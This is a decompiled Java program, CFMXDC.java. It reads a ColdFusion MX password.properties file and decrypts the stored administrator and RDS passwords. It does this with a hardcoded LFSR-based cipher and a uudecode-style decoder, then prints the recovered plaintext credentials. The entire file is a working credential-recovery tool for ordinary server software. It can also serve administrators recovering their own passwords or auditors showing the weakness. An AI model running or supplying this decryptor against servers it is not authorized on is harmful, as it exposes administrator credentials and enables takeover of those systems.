// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   CFMXDC.java

import java.io.*;
import java.text.StringCharacterIterator;

public class CFMXDC
{

    public CFMXDC()
    {
    }

    public static void main(String args[])
        throws Exception
    {
        m_LFSR_A = 0x13579bdf;
        m_LFSR_B = 0x2468ace0;
        m_LFSR_C = 0xfdb97531;
        m_Mask_A = 0x80000062;
        m_Mask_B = 0x40000020;
        m_Mask_C = 0x10000002;
        m_Rot0_A = 0x7fffffff;
        m_Rot0_B = 0x3fffffff;
        m_Rot0_C = 0xfffffff;
        m_Rot1_A = 0x80000000;
        m_Rot1_B = 0xc0000000;
        m_Rot1_C = 0xf0000000;
        try
        {
            FileReader filereader = new FileReader("password.properties");
            BufferedReader bufferedreader = new BufferedReader(filereader);
            do
            {
                String s = bufferedreader.readLine();
                if(s == null)
                    break;
                int i = s.indexOf("password");
                if(i >= 0)
                {
                    String args1[] = s.split("=");
                    if(i == 0)
                        System.out.print("ADMIN_PASS=");
                    else
                        System.out.print("RDS_PASS=");
                    System.out.println(Decrypt(unescape(args1[1]), s.indexOf("rds") < 0 ? "admin" : "rds"));
                }
            } while(true);
            bufferedreader.close();
        }
        catch(Exception exception)
        {
            System.out.println("<*> Couldn't find password.properties file in current working directory!\n");
            throw exception;
        }
        System.exit(0);
    }

    public static String unescape(String s)
    {
        char ac[] = s.toCharArray();
        StringBuffer stringbuffer = new StringBuffer(ac.length);
        for(int i = 0; i < ac.length; i++)
            if(ac[i] == '\\' && i < ac.length - 1)
            {
                i++;
                switch(ac[i])
                {
                case 92: // '\\'
                default:
                    stringbuffer.append(ac[i]);
                    break;
                }
            } else
            {
                stringbuffer.append(ac[i]);
            }

        return stringbuffer.toString();
    }

    private static String Decrypt(String s, String s1)
        throws IOException
    {
        if(s.length() == 0)
        {
            throw new IOException();
        } else
        {
            byte abyte0[] = decode(s);
            byte abyte1[] = transformString(s1, abyte0);
            return new String(abyte1, 0, abyte1.length);
        }
    }

    private static byte[] transformString(String s, byte abyte0[])
    {
        setKey(s);
        int i = abyte0.length;
        byte abyte1[] = new byte[i];
        for(int j = 0; j < i; j++)
            abyte1[j] = transformByte(abyte0[j]);

        return abyte1;
    }

    private static byte transformByte(byte byte0)
    {
        boolean flag = false;
        byte byte1 = 0;
        int i = m_LFSR_B & 1;
        int j = m_LFSR_C & 1;
        for(int k = 0; k < 8; k++)
        {
            if(0 != (m_LFSR_A & 1))
            {
                m_LFSR_A = m_LFSR_A ^ m_Mask_A >>> 1 | m_Rot1_A;
                if(0 != (m_LFSR_B & 1))
                {
                    m_LFSR_B = m_LFSR_B ^ m_Mask_B >>> 1 | m_Rot1_B;
                    i = 1;
                } else
                {
                    m_LFSR_B = m_LFSR_B >>> 1 & m_Rot0_B;
                    i = 0;
                }
            } else
            {
                m_LFSR_A = m_LFSR_A >>> 1 & m_Rot0_A;
                if(0 != (m_LFSR_C & 1))
                {
                    m_LFSR_C = m_LFSR_C ^ m_Mask_C >>> 1 | m_Rot1_C;
                    j = 1;
                } else
                {
                    m_LFSR_C = m_LFSR_C >>> 1 & m_Rot0_C;
                    j = 0;
                }
            }
            byte1 = (byte)(byte1 << 1 | i ^ j);
        }

        byte0 ^= byte1;
        return byte0;
    }

    private static void setKey(String s)
    {
        boolean flag = false;
        m_Key = s;
        if(0 == s.length())
            s = "Default Seed";
        char ac[] = new char[s.length() < 12 ? 12 : s.length()];
        m_Key.getChars(0, m_Key.length(), ac, 0);
        int i = m_Key.length();
        for(int j = 0; i + j < 12; j++)
            ac[i + j] = ac[j];

        for(int k = 0; k < 4; k++)
        {
            m_LFSR_A = (m_LFSR_A <<= 8) | ac[k + 4];
            m_LFSR_B = (m_LFSR_B <<= 8) | ac[k + 4];
            m_LFSR_C = (m_LFSR_C <<= 8) | ac[k + 4];
        }

        if(0 == m_LFSR_A)
            m_LFSR_A = 0x13579bdf;
        if(0 == m_LFSR_B)
            m_LFSR_B = 0x2468ace0;
        if(0 == m_LFSR_C)
            m_LFSR_C = 0xfdb97531;
    }

    private static byte[] decode(String s)
        throws IOException
    {
        byte abyte0[] = new byte[s.length()];
        int i = 0;
        int j = 0;
        boolean flag = false;
        boolean flag1 = false;
        boolean flag2 = false;
        StringCharacterIterator stringcharacteriterator = new StringCharacterIterator(s);
        do
        {
            byte byte0 = DEC(stringcharacteriterator.current());
            stringcharacteriterator.next();
            if(byte0 > 45)
                throw new IOException();
            if(byte0 < 45)
                flag2 = true;
            i += byte0;
            for(; byte0 > 0; byte0 -= 3)
            {
                decodeChars(stringcharacteriterator, abyte0, j);
                j += 3;
            }

            stringcharacteriterator.next();
        } while(!flag2);
        byte abyte1[] = new byte[i];
        for(int k = 0; k < i; k++)
            abyte1[k] = abyte0[k];

        return abyte1;
    }

    private static void decodeChars(StringCharacterIterator stringcharacteriterator, byte abyte0[], int i)
    {
        char c = stringcharacteriterator.current();
        char c1 = stringcharacteriterator.next();
        char c2 = stringcharacteriterator.next();
        char c3 = stringcharacteriterator.next();
        stringcharacteriterator.next();
        byte byte0 = (byte)(DEC(c) << 2 | DEC(c1) >> 4);
        byte byte1 = (byte)(DEC(c1) << 4 | DEC(c2) >> 2);
        byte byte2 = (byte)(DEC(c2) << 6 | DEC(c3));
        abyte0[i] = byte0;
        abyte0[i + 1] = byte1;
        abyte0[i + 2] = byte2;
    }

    private static byte DEC(char c)
    {
        return (byte)(c - 32 & 0x3f);
    }

    private static String m_Key;
    private static int m_LFSR_A;
    private static int m_LFSR_B;
    private static int m_LFSR_C;
    private static int m_Mask_A;
    private static int m_Mask_B;
    private static int m_Mask_C;
    private static int m_Rot0_A;
    private static int m_Rot0_B;
    private static int m_Rot0_C;
    private static int m_Rot1_A;
    private static int m_Rot1_B;
    private static int m_Rot1_C;
}
